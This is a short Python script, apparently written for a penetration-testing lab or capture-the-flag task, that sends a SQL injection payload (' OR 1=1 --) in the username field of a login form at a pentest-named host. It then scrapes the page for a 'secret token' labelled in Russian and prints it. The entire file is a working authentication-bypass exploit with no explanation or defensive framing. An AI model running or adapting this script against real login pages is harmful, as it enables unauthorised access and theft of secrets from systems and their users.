import aiohttp
import asyncio

URL = "http://pentest.caravanlabs.ru/"
payload = "' OR 1=1 --"


async def exploit():
    async with aiohttp.ClientSession() as session:
        data = {"username": payload, "password": "test"}
        async with session.post(URL, data=data) as resp:
            text = await resp.text()
            if "Ваш секретный токен:" in text and resp.status == 200:
                start = text.find("Ваш секретный токен:") + len("Ваш секретный токен: ")
                token = text[start:].split()[0]
                token = token.split("</p>")[0].strip()
                print(f"Токен найден: {token}")
                return
    print("Токена нет")


asyncio.run(exploit())
